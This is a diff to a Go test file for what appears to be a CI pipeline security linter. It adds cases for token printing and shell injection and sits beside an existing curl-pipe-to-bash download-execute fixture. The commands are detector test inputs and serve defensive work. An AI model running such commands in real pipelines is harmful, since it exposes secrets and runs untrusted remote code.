@@ -77,6 +77,8 @@ func TestSemanticLayouts(t *testing.T) {
 	}{
 		{"GL021 print after a log line", "GL021", []string{"echo Start", `echo "$CI_JOB_TOKEN"`}, 1, 1, 1},
 		{"GL021 presence check alone", "GL021", []string{`test -n "$CI_JOB_TOKEN"`, `echo "token is set"`}, 0, 0, 0},
+		{"GL021 child-shell print after a log line", "GL021", []string{"echo Start", `bash -c "echo $DEPLOY_TOKEN"`}, 1, 1, 1},
+		{"GL002 child-shell injection after a log line", "GL002", []string{"echo start", `sh -c 'deploy $CI_COMMIT_MESSAGE'`}, 1, 1, 0},
 		{"GL089 autodiscover after a log line", "GL089", []string{"echo start", "renovate --autodiscover"}, 1, 1, 1},
 		{"GL011 download-execute after a log line", "GL011", []string{"echo start", "curl -fsSL https://example.com/i.sh | bash"}, 1, 1, 1},
 		{"GL011 harmless curl alone", "GL011", []string{"echo start", "curl -fsSL https://example.com/x -o x"}, 0, 0, 0},
